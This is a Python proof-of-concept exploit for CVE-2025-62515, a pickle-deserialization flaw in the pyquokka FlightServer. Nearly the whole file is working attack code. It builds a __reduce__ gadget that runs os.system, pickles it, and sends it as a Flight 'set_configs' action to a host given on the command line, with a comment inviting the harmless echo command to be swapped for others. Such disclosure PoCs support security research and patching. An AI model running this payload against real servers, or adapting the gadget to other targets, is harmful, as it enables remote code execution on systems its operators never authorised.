#!/usr/bin/env python3
"""
PoC Exploit for CVE-2025-62515: RCE via unsafe pickle deserialization in pyquokka FlightServer.
Sends malicious pickled gadget via Flight Action -> do_action() -> pickle.loads() -> RCE.
Author: SK Rahimul Haque
Contact: skrahimulhaque96@gmail.com / https://www.linkedin.com/in/sk-rahimul-haque-51538522a/
"""

import pickle
import pyarrow.flight as flight
import os
import sys

class RCEGadget:
    """
    Malicious gadget class. __reduce__ triggers arbitrary code on deserialization.
    """
    def __reduce__(self):
        # HARmless PoC command - CHANGE THIS FOR YOUR TESTS (e.g., 'id > /tmp/whoami.txt')
        cmd = 'echo "Exploited successfully via CVE-2025-62515"'
        return (os.system, (cmd,))

def main():
    if len(sys.argv) > 1:
        target = sys.argv[1]  # e.g., python exploit.py 192.168.1.100
    else:
        target = "localhost"
    
    location = f"grpc+tcp://{target}:5005"
    print(f"üî• Targeting {location}...")
    
    try:
        client = flight.FlightClient(location)
        
        # Craft and send payload
        gadget = RCEGadget()
        payload = pickle.dumps(gadget)
        action = flight.Action("set_configs", payload)  # Triggers vulnerable do_action()
        
        client.do_action(action)
        print("‚úÖ Exploit sent! Check server console for RCE output.")
        
    except Exception as e:
        print(f"‚ùå Exploit failed: {e}")
        print("üí° Tips: Ensure server is running on vulnerable version; check firewall/port 5005.")

if __name__ == "__main__":
    main()
